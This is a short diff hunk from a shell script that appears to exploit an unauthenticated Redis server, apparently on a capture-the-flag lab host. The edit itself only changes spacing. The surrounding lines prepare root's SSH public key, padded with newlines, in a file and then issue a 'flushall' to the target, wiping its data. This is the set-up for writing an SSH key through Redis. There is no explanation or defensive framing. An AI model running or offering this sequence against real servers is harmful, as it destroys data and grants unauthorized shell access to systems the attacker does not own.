@@ -20,7 +20,7 @@ echo ""
 
 sleep 1
 
-(echo -e "\n\n";cat /root/.ssh/id_rsa.pub;echo -e "\n\n") > foo.txt
+(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
 
 
 value=$( redis-cli -h 10.10.10.160 flushall )
